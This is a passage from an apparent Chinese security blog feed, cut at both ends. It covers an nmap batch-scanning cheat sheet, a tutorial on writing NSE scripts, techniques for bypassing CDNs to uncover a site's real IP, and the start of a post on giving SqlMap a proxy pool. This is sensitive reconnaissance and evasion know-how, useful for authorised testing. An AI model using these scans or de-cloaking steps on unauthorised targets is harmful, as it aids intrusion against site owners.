<span class="selector-tag">-oG</span> – <span class="selector-tag">192</span><span class="selector-class">.168</span><span class="selector-class">.1</span>.* | <span class="selector-tag">grep</span> <span class="selector-tag">open</span>列出开放了指定端口的主机列表</span><br><span class="line"><span class="selector-tag">nmap</span> <span class="selector-tag">-sV</span> <span class="selector-tag">-p</span> <span class="selector-tag">80</span> <span class="selector-tag">thief</span><span class="selector-class">.one</span> 列出服务器类型(列出操作系统，开发端口，服务器类型,网站脚本类型等)</span><br></pre></td></tr></table></figure><p>批量扫描：</p><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">nmap</span> <span class="selector-tag">-sT</span> <span class="selector-tag">-sV</span> <span class="selector-tag">-O</span> <span class="selector-tag">-P0</span> <span class="selector-tag">--open</span> <span class="selector-tag">-n</span> <span class="selector-tag">-oN</span> <span class="selector-tag">result</span><span class="selector-class">.txt</span> <span class="selector-tag">-p80-89</span>,<span class="selector-tag">8080-8099</span>,<span class="selector-tag">8000-8009</span>,<span class="selector-tag">7001-7009</span>,<span class="selector-tag">9000-9099</span>,<span class="selector-tag">21</span>,<span class="selector-tag">443</span>,<span class="selector-tag">873</span>,<span class="selector-tag">2601</span>,<span class="selector-tag">2604</span>,<span class="selector-tag">3128</span>,<span class="selector-tag">4440</span>,<span class="selector-tag">6082</span>,<span class="selector-tag">6379</span>,<span class="selector-tag">8888</span>,<span class="selector-tag">3389</span>,<span class="selector-tag">9200</span>,<span class="selector-tag">11211</span>,<span class="selector-tag">27017</span>,<span class="selector-tag">28017</span>,<span class="selector-tag">389</span>,<span class="selector-tag">8443</span>,<span class="selector-tag">4848</span>,<span class="selector-tag">8649</span>,<span class="selector-tag">995</span>,<span class="selector-tag">9440</span>,<span class="selector-tag">9871</span>,<span class="selector-tag">2222</span>,<span class="selector-tag">2082</span>,<span class="selector-tag">3311</span>,<span class="selector-tag">18100</span>,<span class="selector-tag">9956</span>,<span class="selector-tag">1433</span>,<span class="selector-tag">3306</span>,<span class="selector-tag">1900</span>,<span class="selector-tag">49705</span>,<span class="selector-tag">50030</span>,<span class="selector-tag">7778</span>,<span class="selector-tag">5432</span>,<span class="selector-tag">7080</span>,<span class="selector-tag">5900</span>,<span class="selector-tag">50070</span>,<span class="selector-tag">5000</span>,<span class="selector-tag">5560</span>,<span class="selector-tag">10000</span> <span class="selector-tag">-iL</span> <span class="selector-tag">ip</span><span class="selector-class">.txt</span></span><br><span class="line"></span><br><span class="line"><span class="selector-tag">nmap</span> <span class="selector-tag">-sT</span> <span class="selector-tag">-sV</span> <span class="selector-tag">-p80-89</span>,<span class="selector-tag">8080-8099</span>,<span class="selector-tag">8000-8009</span>,<span class="selector-tag">7001-7009</span>,<span class="selector-tag">9000-9099</span>,<span class="selector-tag">21</span>,<span class="selector-tag">443</span>,<span class="selector-tag">873</span>,<span class="selector-tag">2601</span>,<span class="selector-tag">2604</span>,<span class="selector-tag">3128</span>,<span class="selector-tag">4440</span>,<span class="selector-tag">6082</span>,<span class="selector-tag">6379</span>,<span class="selector-tag">8888</span>,<span class="selector-tag">3389</span>,<span class="selector-tag">9200</span>,<span class="selector-tag">11211</span>,<span class="selector-tag">27017</span>,<span class="selector-tag">28017</span>,<span class="selector-tag">389</span>,<span class="selector-tag">8443</span>,<span class="selector-tag">4848</span>,<span class="selector-tag">8649</span>,<span class="selector-tag">995</span>,<span class="selector-tag">9440</span>,<span class="selector-tag">9871</span>,<span class="selector-tag">2222</span>,<span class="selector-tag">2082</span>,<span class="selector-tag">3311</span>,<span class="selector-tag">18100</span>,<span class="selector-tag">9956</span>,<span class="selector-tag">1433</span>,<span class="selector-tag">3306</span>,<span class="selector-tag">1900</span>,<span class="selector-tag">49705</span>,<span class="selector-tag">50030</span>,<span class="selector-tag">7778</span>,<span class="selector-tag">5432</span>,<span class="selector-tag">7080</span>,<span class="selector-tag">5900</span>,<span class="selector-tag">50070</span>,<span class="selector-tag">5000</span>,<span class="selector-tag">5560</span>,<span class="selector-tag">10000</span> <span class="selector-tag">--open</span> <span class="selector-tag">--max-hostgroup</span> <span class="selector-tag">10</span> <span class="selector-tag">--max-parallelism</span> <span class="selector-tag">10</span> <span class="selector-tag">--max-rtt-timeout</span> <span class="selector-tag">1000ms</span> <span class="selector-tag">--host-timeout</span> <span class="selector-tag">800s</span> <span class="selector-tag">--max-scan-delay</span> <span class="selector-tag">2000ms</span> <span class="selector-tag">-iL</span> ~/<span class="selector-tag">Desktop</span>/<span class="selector-tag">ip</span><span class="selector-class">.txt</span> <span class="selector-tag">-oN</span> ~/<span class="selector-tag">Desktop</span>/<span class="selector-tag">result</span>/<span class="selector-tag">result</span><span class="selector-class">.txt</span></span><br></pre></td></tr></table></figure><h2 id="nmap参数">nmap参数</h2><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">nmap</span> <span class="selector-attr">[Scan Type(s)]</span> <span class="selector-attr">[Options]</span> &#123;<span class="selector-tag">target</span> <span class="selector-tag">specification</span>&#125;</span><br><span class="line"><span class="selector-tag">scan</span> <span class="selector-tag">type</span>(s) 用于指定扫描类型</span><br><span class="line"><span class="selector-tag">options</span> 用于指定选项</span><br><span class="line"><span class="selector-tag">target</span> <span class="selector-tag">specification</span> 用于指定扫描目标</span><br><span class="line"><span class="selector-tag">-s</span> 指定扫描类型</span><br><span class="line">如下：</span><br><span class="line"><span class="selector-tag">-sP</span> (ping扫描) *存活主机探测</span><br><span class="line"><span class="selector-tag">-sS</span> (TCP SYN扫描 隐身扫描) *默认扫描方式，使用频率最高的半开放扫描</span><br><span class="line"><span class="selector-tag">-sT</span> (tcp 扫描) *<span class="selector-tag">TCP</span> <span class="selector-tag">connect</span>()默认的扫描方式，完成三次握手</span><br><span class="line"><span class="selector-tag">-sU</span> （<span class="selector-tag">UDP</span> 扫描）用来探测目的的<span class="selector-tag">UDP</span>端口，不需要发送任何的<span class="selector-tag">SYN</span>包，发送<span class="selector-tag">UDP</span>数据包到目的主机等待响应</span><br><span class="line"><span class="selector-tag">-sA</span> （<span class="selector-tag">ACK</span>扫描） *三次握手 用于探测出防火墙过滤端口 实际渗透中没多大用</span><br><span class="line"><span class="selector-tag">-sV</span> （版本探测）</span><br><span class="line"><span class="selector-tag">-A</span>综合扫描（系统探测，版本探测，路由追踪以及一些常用脚本的扫描）</span><br><span class="line"><span class="selector-tag">-O</span> （启用操作系统检测）</span><br><span class="line"><span class="selector-tag">-v</span>详细</span><br><span class="line">选项说明</span><br><span class="line"><span class="selector-tag">-P0</span> <span class="selector-attr">[指定端口]</span> (无ping扫描)</span><br><span class="line"><span class="selector-tag">-PU</span> <span class="selector-attr">[指定端口]</span> (udp ping扫描)</span><br><span class="line"><span class="selector-tag">-PS</span> <span class="selector-attr">[指定端口]</span> (TCP SYN ping 扫描)</span><br><span class="line"><span class="selector-tag">-PA</span> <span class="selector-attr">[指定端口]</span> (tcp ack ping扫描)</span><br><span class="line"><span class="selector-tag">-PI</span> 使用真正的<span class="selector-tag">pingICMP</span> <span class="selector-tag">echo</span>请求来扫描目标主机是否正在运行</span><br><span class="line"><span class="selector-tag">-iL</span> 指定扫描主机列表</span><br><span class="line"><span class="selector-tag">-iR</span> 随机选择目标</span><br><span class="line">–<span class="selector-tag">exclude</span> 排除扫描目标</span><br><span class="line">–<span class="selector-tag">excludefile</span> 排除文件中目标列表</span><br><span class="line"><span class="selector-tag">-n</span> (不用域名解析)</span><br><span class="line"><span class="selector-tag">-R</span> (为所有目标解析域名)</span><br><span class="line"><span class="selector-tag">-T</span> 时间优化（每隔多久发一次包 ） <span class="selector-tag">-T5</span> 最快 <span class="selector-tag">-T0</span> 最慢（<span class="selector-tag">5</span>适合局域网）</span><br><span class="line"><span class="selector-tag">-F</span> 快速扫描</span><br><span class="line"><span class="selector-tag">-e</span> 指定网络接口</span><br><span class="line"><span class="selector-tag">-M</span> 设置<span class="selector-tag">tcp</span>扫描线程</span><br><span class="line"><span class="selector-tag">-iL</span> 文件 指定一个文本内的所有主机</span><br><span class="line"><span class="selector-tag">nmap</span>的输出：<span class="selector-tag">oN</span>，<span class="selector-tag">oX</span>，<span class="selector-tag">oS</span>，<span class="selector-tag">oG</span>（结果为一般模式。<span class="selector-tag">XML</span>，<span class="selector-tag">kiddi3</span>，<span class="selector-tag">grepable</span>格式）</span><br><span class="line"><span class="selector-tag">nmap</span>输出 <span class="selector-tag">ip</span>：<span class="selector-tag">port</span> 格式：</span><br><span class="line">nmap -vv -p 80 192.168.1.0/24 | grep “Discovered open port” | awk &#123;‘print $6”:”$4’&#125; | awk -F/ &#123;‘print $1’&#125; &gt; output.txt</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;namp端口状态&quot;&gt;namp端口状态&lt;/h2&gt;
&lt;figure class=&quot;highlight less&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class
      
    
    </summary>
    
    
      <category term="工具" scheme="http://yoursite.com/categories/%E5%B7%A5%E5%85%B7/"/>
    
    
      <category term="NMAP" scheme="http://yoursite.com/tags/NMAP/"/>
    
  </entry>
  
  <entry>
    <title>NSE编写</title>
    <link href="http://yoursite.com/2020/06/27/NSE%E7%BC%96%E5%86%99/"/>
    <id>http://yoursite.com/2020/06/27/NSE%E7%BC%96%E5%86%99/</id>
    <published>2020-06-27T06:52:11.000Z</published>
    <updated>2020-06-27T06:52:11.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="NSE简介">NSE简介</h2><blockquote><p>Nmap 一款标志性的跨平台扫描器。它的原意为Network Mapper（网络映射器），具有相当强大的扫描功能。Nmap还可根据NSE (Nmap scripting Engine)的脚本进行大量渗透工作，这种脚本是基于Lua编程语言。正是NSE，使得Nmap不再普通。</p></blockquote><h3 id="Nmap的目录结构">Nmap的目录结构</h3><p><strong>Linux</strong></p><p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200627140946.png" alt=""></p><p><strong>Windows</strong></p><p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200627140933.png" alt=""></p><p>主要关注两个目录：</p><ul><li>neslib存放着各种库文件</li><li>script存放着NSE脚本</li></ul><p>nmap脚本和库文件手册：<a href="https://nmap.org/nsedoc/">https://nmap.org/nsedoc/</a></p><h2 id="NSE中的库文件">NSE中的库文件</h2><p>NSE中的库文件实现了代码的分离和重构，有助于脚本的开发，其存放在nselib文件夹中。</p><h3 id="库文件的编写">库文件的编写</h3><p>创建一个库文件保存为demo.lua，用于对于传入的参数 返回 这个端口 是开启的。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">function Test( port )</span><br><span class="line">return string.format(&quot;The port &#39;%s&#39; is open&quot;,port)</span><br><span class="line">end</span><br></pre></td></tr></table></figure><p>在脚本文件中引入这个库文件，引入库文件的格式一般为<br><strong>local 库文件名 = require “库文件名”</strong><br>业界人士称，在lua中，如果是一些经常用到的全局函数，可以申明为local局部变量，这样做可以提升效率。</p><p>在脚本中使用此库文件中的函数。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">local shortport &#x3D; require &quot;shortport&quot;</span><br><span class="line">local demo &#x3D; require &quot;demo&quot;</span><br><span class="line">description &#x3D; [[neslib demo test]]</span><br><span class="line">categories &#x3D; &#123;&quot;default&quot;&#125;</span><br><span class="line"></span><br><span class="line">portrule &#x3D; function(host,port)</span><br><span class="line">    return port.protocol &#x3D;&#x3D; &quot;tcp&quot; and port.number &#x3D;&#x3D; 30081  and port.state &#x3D;&#x3D;&quot;open&quot;</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">action &#x3D; function(host, port)</span><br><span class="line">return Test(port.number)</span><br><span class="line">end</span><br></pre></td></tr></table></figure><h2 id="NSE编写规则">NSE编写规则</h2><h3 id="NSE脚本编写流程">NSE脚本编写流程</h3><p>大致分为四步：</p><blockquote><ol><li>导入脚本所需库</li><li>脚本描述信息及分类</li><li>rule类型：脚本的触发规则</li><li>action：脚本具体执行内容，rule触发规则为真时执行action定义的函数</li></ol></blockquote><p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200627105747.jpg" alt=""></p><h3 id="Rule四种类型">Rule四种类型</h3><p>Rule：用于描述脚本的触发规则，返回值只有true和false两种。返回值决定了后面action对应的函数是否执行，注意：true(执行),flase(不执行)。它有四种类型分别是</p><ol><li>prerule()：不接收参数，脚本只运行一次，<font color=red>在主机发现之前</font>，发生在预扫描阶段。返回的值永远为真。</li><li>hostrule(host)：设定参数为目标的ip地址或主机名，nmap完成了<font color=red>主机发现之后</font>再运行脚本。</li><li>portrule(host,port)：设定参数需要主机以及端口。<font color=red>在端口扫描时</font>，每个端口运行一次，处于open，open|filtered，或者unfiltered状态的所有端口。</li><li>postrule()：不接收参数，nmap完成<font color=red>所有主机已经被扫描后</font>，在脚本的后扫描阶段。返回的值永远为真。</li></ol><p>举个例子：<br>在扫描之前触发脚本，打印<code>I Love China.</code></p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">description = <span class="string">[[test]]</span></span><br><span class="line"></span><br><span class="line">author = <span class="string">&quot;Edsion&quot;</span></span><br><span class="line">license = <span class="string">&quot;Same as Nmap‐‐See http://nmap.org/book/man‐legal.html&quot;</span></span><br><span class="line">categories = &#123;<span class="string">&quot;default&quot;</span>,<span class="string">&quot;safe&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line">prerule = <span class="function"><span class="keyword">function</span><span class="params">(host,port)</span></span></span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">action = <span class="function"><span class="keyword">function</span><span class="params">(host, port)</span></span></span><br><span class="line"><span class="keyword">return</span> <span class="string">&quot;I Love China.&quot;</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure><h3 id="调试模式">调试模式</h3><p>在测试阶段我们难免会出现错误,那假设我们出现了错误我们应该如何解决呢。这时我们需要借助Nmap的调试模式进行调试，只需要加上-d选项即可进入调试模式，那一般选择-d 3，3代表的是等级，等级越高，越详细。</p><h2 id="nmap-API">nmap API</h2><blockquote><p>nmap中API的核心功能就是向脚本提供主机和端口的信息。<br>两个lua table类型的参数：host table 、 port table</p></blockquote><table><thead><tr><th>host</th><th>table类型</th></tr></thead><tbody><tr><td>host.os</td><td>操作系统信息</td></tr><tr><td>host.ip</td><td>tagret(目标主机)对应的ip,例如下面的127.0.0.1</td></tr><tr><td><a href="http://host.name">host.name</a></td><td>tagert在命令行对应的名字，<a href="http://xn--zzcms-bi1hr3gd63auv3d8xxd.im">例如下面的zzcms.im</a></td></tr><tr><td>host.targetname</td><td><a href="http://xn--host-z94f813a.name">同上host.name</a>，我个人是这样认为的</td></tr><tr><td>host.directly_connected</td><td>判断目标主机是否与本机在同一个子网</td></tr><tr><td>host.mac_addr</td><td>mac地址 （必须是同一子网的设备这个命令才有效）</td></tr></tbody></table><table><thead><tr><th>port</th><th>table类型</th></tr></thead><tbody><tr><td>port.number</td><td>端口号</td></tr><tr><td>port.protocol</td><td>协议</td></tr><tr><td>port.service</td><td>服务 http或https</td></tr><tr><td>port.version</td><td>版本信息</td></tr><tr><td>port.state</td><td>端口状态</td></tr></tbody></table><h2 id="http库参数扩展">http库参数扩展</h2><table><thead><tr><th>http</th><th>库</th></tr></thead><tbody><tr><td>get()</td><td>发起get请求，请求结果以一个table的形式返回</td></tr><tr><td>host</td><td>要请求的主机</td></tr><tr><td>path</td><td>要检索的路径</td></tr><tr><td>options</td><td>可选，允许调用者控制socket,请求头的table</td></tr><tr><td>port</td><td>要检索的端口</td></tr><tr><td></td><td></td></tr><tr><td>post()</td><td>发起post请求，请求结果以一个table的形式返回</td></tr><tr><td>ignored</td><td>向后兼用，一般填写nil，忽略即可</td></tr><tr><td>postdata</td><td>post数据，字符串或者table格式</td></tr><tr><td>host</td><td>要请求的主机</td></tr><tr><td>path</td><td>要检索的路径</td></tr><tr><td>options</td><td>可选，允许调用者控制socket,请求头,超时时间的table</td></tr><tr><td>port</td><td>要检索的端口</td></tr></tbody></table><h2 id="NSE脚本分类">NSE脚本分类</h2><table><thead><tr><th>脚本类别</th><th>描述</th></tr></thead><tbody><tr><td>auth</td><td>与用户认证相关的NSE脚本</td></tr><tr><td>broadcast</td><td>在局域网内探查更多服务开启状况，如dhcp/dns/sqlserver等服务</td></tr><tr><td>brute</td><td>暴力破解</td></tr><tr><td>default</td><td>默认，执行脚本（-A或者-sC）</td></tr><tr><td>discovery</td><td>与主机和服务发现相关的脚本</td></tr><tr><td>dos</td><td>与拒绝服务攻击有关的脚本</td></tr><tr><td>exploit</td><td>利用已知的漏洞入侵系统</td></tr><tr><td>external</td><td>利用第三方的数据库或资源，例如进行whois解析</td></tr><tr><td>fuzzer</td><td>模糊测试的脚本，发送异常的包到目标机，探测出潜在漏洞</td></tr><tr><td>intrusive</td><td>入侵性的脚本，此类脚本可能引发对方的IDS/IPS的记录或屏蔽</td></tr><tr><td>malware</td><td>探测目标机是否感染了病毒、开启了后门等信息</td></tr><tr><td>safe</td><td>此类与intrusive相反，属于安全性脚本</td></tr><tr><td>vuln</td><td>负责检查目标机是否有常见的漏洞（Vulnerability），如是否有MS08_067</td></tr><tr><td>version</td><td>负责增强服务与版本扫描（Version Detection）功能的脚本</td></tr></tbody></table><h2 id="NSE脚本使用">NSE脚本使用</h2><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">直接加脚本名称</span><br><span class="line">nmap --script http-title &lt;target&gt;</span><br><span class="line">nmap --script http-title，http-methods &lt;target&gt;</span><br><span class="line"></span><br><span class="line">类别</span><br><span class="line">nmap --script exploit &lt;target&gt;</span><br><span class="line">您也可以用逗号分隔它们来运行多个类别：</span><br><span class="line">nmap --script discovery,intrusive &lt;target&gt;</span><br><span class="line"></span><br><span class="line">路径或文件名（文件夹）</span><br><span class="line">nmap --script /path/to/script.nse &lt;target&gt;</span><br><span class="line">nmap --script /path/to/script.nse,/another/path/script2.nse &lt;target&gt;</span><br><span class="line"></span><br><span class="line">表达式</span><br><span class="line">nmap -sV --script &quot;not exploit&quot; &lt;target&gt;</span><br><span class="line">nmap --script &quot;not（intrusive or dos or exploit）&quot; -sV &lt;target&gt;</span><br><span class="line">通配符</span><br><span class="line">nmap --script &quot;snmp- *&quot; &lt;target&gt;</span><br><span class="line"></span><br><span class="line">为脚本提供参数 </span><br><span class="line">--script-args=x=x,y=y</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;NSE简介&quot;&gt;NSE简介&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;Nmap 一款标志性的跨平台扫描器。它的原意为Network Mapper（网络映射器），具有相当强大的扫描功能。Nmap还可根据NSE (Nmap scripting Engine)的脚本进行大
      
    
    </summary>
    
    
      <category term="工具" scheme="http://yoursite.com/categories/%E5%B7%A5%E5%85%B7/"/>
    
    
      <category term="NMAP" scheme="http://yoursite.com/tags/NMAP/"/>
    
  </entry>
  
  <entry>
    <title>绕过CDN寻找真实IP</title>
    <link href="http://yoursite.com/2020/06/23/%E7%BB%95%E8%BF%87CDN/"/>
    <id>http://yoursite.com/2020/06/23/%E7%BB%95%E8%BF%87CDN/</id>
    <published>2020-06-23T04:17:11.000Z</published>
    <updated>2020-06-23T04:17:11.000Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>目前很多站点出于用户体验和安全的角度，使用CDN加速，将域名解析到CDN，这时候就需要绕过CDN来查找真实IP。</p></blockquote><h2 id="一、DNS历史解析记录">一、DNS历史解析记录</h2><p>查询域名的历史解析记录，找网站使用CDN前的解析记录，从而获取真实ip，相关查询的网站有：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">iphistory：https://viewdns.info/iphistory/</span><br><span class="line">DNS查询：（https://dnsdb.io/zh-cn/）</span><br><span class="line">微步在线：（https://x.threatbook.cn/）</span><br><span class="line">域名查询：（https://site.ip138.com/）</span><br><span class="line">DNS历史查询：（https://securitytrails.com/）</span><br><span class="line">Netcraft：https://sitereport.netcraft.com/?url=github.com</span><br></pre></td></tr></table></figure><h2 id="二、子域名">二、子域名</h2><p>很多时候，一些重要的站点会做CDN，而一些子域名站点并没有加入CDN，而且跟主站在同一个C段内，这时候，就可以通过查找子域名来查找网站的真实IP。<br>常用的子域名查找方法和工具：</p><ol><li>搜索引擎查询：如Google、baidu、Bing等传统搜索引擎，site:baidu.com inurl:baidu.com，搜target.com|公司名字。</li><li>在线查询网站：</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;tool.chinaz.com&#x2F;subdomain&#x2F;</span><br><span class="line">http:&#x2F;&#x2F;i.links.cn&#x2F;subdomain&#x2F;    </span><br><span class="line">http:&#x2F;&#x2F;subdomain.chaxun.la&#x2F;</span><br><span class="line">http:&#x2F;&#x2F;searchdns.netcraft.com&#x2F;</span><br><span class="line">https:&#x2F;&#x2F;www.virustotal.com&#x2F;</span><br></pre></td></tr></table></figure><ol start="3"><li>子域名爆破工具</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Layer子域名挖掘机</span><br><span class="line">wydomain：https:&#x2F;&#x2F;github.com&#x2F;ring04h&#x2F;wydomain    </span><br><span class="line">subDomainsBrute:https:&#x2F;&#x2F;github.com&#x2F;lijiejie&#x2F;</span><br><span class="line">Sublist3r:https:&#x2F;&#x2F;github.com&#x2F;aboul3la&#x2F;Sublist3r</span><br></pre></td></tr></table></figure><h2 id="三、网站邮件头信息">三、网站邮件头信息</h2><p>比如：邮箱注册，邮箱找回密码、RSS邮件订阅等功能场景，通过网站给自己发送邮件，从而让目标主动暴露他们的真实的IP，查看邮件头信息，获取到网站的真实IP。</p><p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200623112316.png" alt=""></p><h2 id="四、网络空间安全引擎搜索">四、网络空间安全引擎搜索</h2><p>通过关键字或网站域名，就可以找出被收录的IP，很多时候获取到的就是网站的真实IP。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">钟馗之眼：https:&#x2F;&#x2F;www.zoomeye.org</span><br><span class="line">Shodan：https:&#x2F;&#x2F;www.shodan.io</span><br><span class="line">Fofa：https:&#x2F;&#x2F;fofa.so</span><br></pre></td></tr></table></figure><h2 id="五、利用SSL证书">五、利用SSL证书</h2><p>证书颁发机构(CA)必须将他们发布的每个SSL/TLS证书发布到公共日志中，SSL/TLS证书通常包含域名、子域名和电子邮件地址。因此SSL/TLS证书成为了攻击者的切入点。<br>SSL证书搜索引擎：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;censys.io&#x2F;ipv4?q&#x3D;github.com</span><br></pre></td></tr></table></figure><h2 id="六、国外主机解析域名">六、国外主机解析域名</h2><p>大部分 CDN 厂商因为各种原因只做了国内的线路，而针对国外的线路可能几乎没有，此时我们使用国外的DNS查询，很可能获取到真实IP。<br>国外多PING测试工具：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;asm.ca.com&#x2F;zh_cn&#x2F;ping.php</span><br><span class="line">http:&#x2F;&#x2F;host-tracker.com&#x2F;</span><br><span class="line">http:&#x2F;&#x2F;www.webpagetest.org&#x2F;</span><br><span class="line">https:&#x2F;&#x2F;dnscheck.pingdom.com&#x2F;</span><br></pre></td></tr></table></figure><h2 id="七、全网扫描">七、全网扫描</h2><p>通过Zmap、masscan等工具对整个互联网发起扫描，针对扫描结果进行关键字查找，获取网站真实IP。</p><ol><li>ZMap号称是最快的互联网扫描工具，能够在45分钟扫遍全网。</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;zmap&#x2F;zmap</span><br></pre></td></tr></table></figure><ol start="2"><li>Masscan号称是最快的互联网端口扫描器，最快可以在六分钟内扫遍互联网。</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;robertdavidgraham&#x2F;masscan</span><br></pre></td></tr></table></figure><h2 id="八、配置不当导致绕过">八、配置不当导致绕过</h2><p>在配置CDN的时候，需要指定域名、端口等信息，有时候小小的配置细节就容易导致CDN防护被绕过。</p><ul><li>案例1：为了方便用户访问，<a href="http://xn--www-ot9d021dl8ca199e.test.com">我们常常将www.test.com</a> 和 <a href="http://test.com">test.com</a> 解析到同一个站点，<a href="http://xn--CDNwww-5e8i318auw2h9jblx9h.test.com">而CDN只配置了www.test.com</a>，<a href="http://xn--test-pr9lp7quqa868a.com">通过访问test.com</a>，就可以绕过 CDN 了。</li><li>案例2：站点同时支持http和https访问，CDN只配置 https协议，那么这时访问http就可以轻易绕过。</li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;目前很多站点出于用户体验和安全的角度，使用CDN加速，将域名解析到CDN，这时候就需要绕过CDN来查找真实IP。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;一、DNS历史解析记录&quot;&gt;一、DNS历史解析记录&lt;/h2&gt;
&lt;p&gt;查询域名的历史解
      
    
    </summary>
    
    
      <category term="渗透" scheme="http://yoursite.com/categories/%E6%B8%97%E9%80%8F/"/>
    
    
      <category term="技巧" scheme="http://yoursite.com/tags/%E6%8A%80%E5%B7%A7/"/>
    
  </entry>
  
  <entry>
    <title>SqlMap代理池</title>
    <link href="http://yoursite.com/2020/06/22/%E4%BB%A3%E7%90%86%E6%B1%A0/"/>
    <id>http://yoursite.com/2020/06/22/%E4%BB%A3%E7%90%86%E6%B1%A0/</id>
    <published>2020-06-22T07:16:21.000Z</published>
    <updated>2020-06-22T07:16:21.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="获取代理池">获取代理池</h2><p>获取代理池使用了GIthub上的项目：<a href="https://github.com/jhao104/proxy_pool">https://github.com/jhao104/proxy_pool</a> ，并利用REDIS存储获取到的代理地址</p><h3 id="启动项目">启动项目</h3><p>在<code>cli</code>目录下通过<code>ProxyPool.py</code>启动</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 首先启动调度程序</span><br><span class="line">&gt;&gt;&gt;python proxyPool.py schedule</span><br><span class="line"></span><br><span class="line"># 然后启动webApi服务</span><br><span class="line">&gt;&gt;&gt;python proxyPool.py webserver</span><br></pre></td></tr></table></figure><h3 id="Api">Api</h3><p>启动过几分钟后就能看到抓取到的代理IP，可以直接到数据库中查看，也可以通过api访问http://127.0.0.1:5010 